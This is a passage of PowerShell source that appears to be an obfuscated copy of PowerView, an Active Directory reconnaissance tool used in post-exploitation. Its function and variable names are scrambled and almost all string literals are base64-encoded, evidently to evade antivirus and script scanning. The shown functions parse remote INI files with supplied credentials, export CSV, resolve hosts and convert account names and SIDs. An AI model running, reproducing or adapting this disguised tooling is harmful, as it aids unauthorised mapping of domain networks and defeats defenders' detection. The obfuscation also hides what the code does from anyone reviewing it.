            ${___/=\__/=\_/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEEAbABsAG8AdwBOAHUAbABsAHwAQQBsAGwAbwB3AEUAbQBwAHQAeQBTAHQAcgBpAG4AZwB8AEEAbABsAG8AdwBFAG0AcAB0AHkAQwBvAGwAbABlAGMAdABpAG8AbgB8AFYAYQBsAGkAZABhAHQAZQBDAG8AdQBuAHQAfABWAGEAbABpAGQAYQB0AGUATABlAG4AZwB0AGgAfABWAGEAbABpAGQAYQB0AGUAUABhAHQAdABlAHIAbgB8AFYAYQBsAGkAZABhAHQAZQBSAGEAbgBnAGUAfABWAGEAbABpAGQAYQB0AGUAUwBjAHIAaQBwAHQAfABWAGEAbABpAGQAYQB0AGUAUwBlAHQAfABWAGEAbABpAGQAYQB0AGUATgBvAHQATgB1AGwAbAB8AFYAYQBsAGkAZABhAHQAZQBOAG8AdABOAHUAbABsAE8AcgBFAG0AcAB0AHkAKQAkAA==')))
            ${_/\/\/\/=======\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBBAGwAaQBhAHMAJAA=')))
            ${/==\/==\_/===\/==} = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                ${/=\/\_/\/\__/\_/\} {
                    Try {
                        ${/==\/==\_/===\/==}.$_ = . ${__/=\_/=\___/\__/}
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if(${__/\/\_/\/===\_/\}.Keys -contains $Name) {
                ${__/\/\_/\/===\_/\}.$Name.Attributes.Add(${/==\/==\_/===\/==})
            }
            else {
                ${__/==\/===\__/\__} = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    ${___/=\__/=\_/=\/=} {
                        Try {
                            ${/===\/\_/=\_/\_/\} = New-Object -TypeName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAewBfAH0AQQB0AHQAcgBpAGIAdQB0AGUA'))) -ArgumentList (. ${__/=\_/=\___/\__/}) -ErrorAction Stop
                            ${__/==\/===\__/\__}.Add(${/===\/\_/=\_/\_/\})
                        }
                        Catch { $_ }
                        continue
                    }
                    ${_/\/\/\/=======\_} {
                        Try {
                            ${_/\/=\__/=\/\____} = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. ${__/=\_/=\___/\__/}) -ErrorAction Stop
                            ${__/==\/===\__/\__}.Add(${_/\/=\__/=\/\____})
                            continue
                        }
                        Catch { $_ }
                    }
                }
                ${__/==\/===\__/\__}.Add(${/==\/==\_/===\/==})
                ${___/\/\_/\/\/\___} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, ${__/==\/\/=\__/=\__}, ${__/==\/===\__/\__})
                ${__/\/\_/\/===\_/\}.Add($Name, ${___/\/\_/\/\/\___})
            }
        }
    }
    End {
        if(!$CreateVariables -and !$Dictionary) {
            ${__/\/\_/\/===\_/\}
        }
    }
}
function __/\___/=\____/==\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        ${__/\/\_/=\/===\/\/}
    )
    BEGIN {
        ${/=\_/\__/\_/=\/\/} = @{}
    }
    PROCESS {
        ForEach (${/=\/=\_/\/===\/==} in $Path) {
            if ((${/=\/=\_/\/===\/==} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${__/\/\_/\_/\/==\_} = (New-Object System.Uri(${/=\/=\_/\/===\/==})).Host
                if (-not ${/=\_/\__/\_/=\/\/}[${__/\/\_/\_/\/==\_}]) {
                    _/=\____/\/\/=\__/ -/=\/\/\/=\__/\_/= ${__/\/\_/\_/\/==\_} -Credential $Credential
                    ${/=\_/\__/\_/=\/\/}[${__/\/\_/\_/\/==\_}] = $True
                }
            }
            if (Test-Path -Path ${/=\/=\_/\/===\/==}) {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                    ${_/\/=\/=\/=\__/\/} = New-Object PSObject
                }
                else {
                    ${_/\/=\/=\/=\__/\/} = @{}
                }
                Switch -Regex -File ${/=\/=\_/\/===\/==} {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
                    {
                        ${_/\________/\/\/=} = $matches[1].Trim()
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            ${_/\________/\/\/=} = ${_/\________/\/\/=}.Replace(' ', '')
                            ${/=\/==\/\__/==\__} = New-Object PSObject
                            ${_/\/=\/=\/=\__/\/} | Add-Member Noteproperty ${_/\________/\/\/=} ${/=\/==\/\__/==\__}
                        }
                        else {
                            ${_/\/=\/=\/=\__/\/}[${_/\________/\/\/=}] = @{}
                        }
                        ${_/\_/=\___/==\/==} = 0
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoADsALgAqACkAJAA='))) 
                    {
                        ${_____/===\___/\/\} = $matches[1].Trim()
                        ${_/\_/=\___/==\/==} = ${_/\_/=\___/==\/==} + 1
                        $Name = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) + ${_/\_/=\___/==\/==}
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${_/\/=\/=\/=\__/\/}.${_/\________/\/\/=} | Add-Member Noteproperty $Name ${_____/===\___/\/\}
                        }
                        else {
                            ${_/\/=\/=\/=\__/\/}[${_/\________/\/\/=}][$Name] = ${_____/===\___/\/\}
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
                    {
                        $Name, ${_____/===\___/\/\} = $matches[1..2]
                        $Name = $Name.Trim()
                        ${_/\_/\/===\/===\_} = ${_____/===\___/\/\}.split(',') | % { $_.Trim() }
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${_/\/=\/=\/=\__/\/}.${_/\________/\/\/=} | Add-Member Noteproperty $Name ${_/\_/\/===\/===\_}
                        }
                        else {
                            ${_/\/=\/=\/=\__/\/}[${_/\________/\/\/=}][$Name] = ${_/\_/\/===\/===\_}
                        }
                    }
                }
                ${_/\/=\/=\/=\__/\/}
            }
        }
    }
    END {
        ${/=\_/\__/\_/=\/\/}.Keys | __/======\__/===\_
    }
}
function Export-PowerViewCSV {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',
        [Switch]
        $Append
    )
    BEGIN {
        ${__/=\___/\_/\/===} = [IO.Path]::GetFullPath($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))])
        ${_/=\/=====\_/\___} = [System.IO.File]::Exists(${__/=\___/\_/\/===})
        ${/=\/\/=\___/=\_/=} = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')))
        $Null = ${/=\/\/=\___/=\_/=}.WaitOne()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA')))]) {
            ${_/=\_/\/==\/\__/\} = [System.IO.FileMode]::Append
        }
        else {
            ${_/=\_/\/==\/\__/\} = [System.IO.FileMode]::Create
            ${_/=\/=====\_/\___} = $False
        }
        ${_/\_/\_/\___/=\/=} = New-Object IO.FileStream(${__/=\___/\_/\/===}, ${_/=\_/\/==\/\__/\}, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        ${/=\_/=\/\/=\_/\/\} = New-Object System.IO.StreamWriter(${_/\_/\_/\___/=\/=})
        ${/=\_/=\/\/=\_/\/\}.AutoFlush = $True
    }
    PROCESS {
        ForEach (${/=\/\___/=\/=\/==} in $InputObject) {
            ${/=\/\/\/\/==\/\/\} = ConvertTo-Csv -InputObject ${/=\/\___/=\/=\/==} -Delimiter $Delimiter -NoTypeInformation
            if (-not ${_/=\/=====\_/\___}) {
                ${/=\/\/\/\/==\/\/\} | % { ${/=\_/=\/\/=\_/\/\}.WriteLine($_) }
                ${_/=\/=====\_/\___} = $True
            }
            else {
                ${/=\/\/\/\/==\/\/\}[1..(${/=\/\/\/\/==\/\/\}.Length-1)] | % { ${/=\_/=\/\/=\_/\/\}.WriteLine($_) }
            }
        }
    }
    END {
        ${/=\/\/=\___/=\_/=}.ReleaseMutex()
        ${/=\_/=\/\/=\_/\/\}.Dispose()
        ${_/\_/\_/\___/=\/=}.Dispose()
    }
}
function _/=====\___/====== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = ${Env:/=\/\/\/=\__/\_/=}
    )
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            try {
                @(([Net.Dns]::GetHostEntry(${/\_______/\/\/=\/})).AddressList) | % {
                    if ($_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        ${/==\/===\__/\___/} = New-Object PSObject
                        ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                        ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                        ${/==\/===\__/\___/}
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAcwBvAGwAdgBlAC0ASQBQAEEAZABkAHIAZQBzAHMAXQAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAcgBlAHMAbwBsAHYAZQAgACQAewAvAFwAXwBfAF8AXwBfAF8AXwAvAFwALwBcAC8APQBcAC8AfQAgAHQAbwAgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
            }
        }
    }
}
function ___/\___/\/===\_/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        ${_/\/\_/\____/\/==},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\_/====\/===\/=} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\_/====\/===\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\_/====\/===\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/====\/===\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($Object in ${_/\/\_/\____/\/==}) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${___/=\____/=\/\__} = __/\/=\_/\/=\/=\_/ -Identity $Object -_/============\/\/ 'DN' @_/\_/====\/===\/=
                if (${___/=\____/=\/\__}) {
                    $UserDomain = ${___/=\____/=\/\__}.SubString(${___/=\____/=\/\__}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${/=\__/\_/\__/\/\_} = ${___/=\____/=\/\__}.Split(',')[0].split('=')[1]
                    ${_/\_/====\/===\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\__/\_/\__/\/\_}
                    ${_/\_/====\/===\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                    ${_/\_/====\/===\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))
                    _____/\/==\/\_/=== @_/\_/====\/===\/= | select -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${_/\_/====\/===\/=} = @{}
                        $Domain = (__/\/\__/=\/\/\/\/ @_/\_/====\/===\/=).Name
                    }
                    ${__/\/==\_/\/\/==\} = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    ${__/\/==\_/\/\/==\}.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AFQAbwAtAFMASQBEAF0AIABFAHIAcgBvAHIAIABjAG8AbgB2AGUAcgB0AGkAbgBnACAAJABEAG8AbQBhAGkAbgBcACQATwBiAGoAZQBjAHQAIAA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function __/\/=\/=\_/\/=\/= {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        ${/===\_/\_/\_/=\__},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${___/=\/=\__/====\} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${_/\__/====\/\__/\} in ${/===\_/\_/\_/=\__}) {
            ${_/\__/====\/\__/\} = ${_/\__/====\/\__/\}.trim('*')
            try {
                Switch (${_/\__/====\/\__/\}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
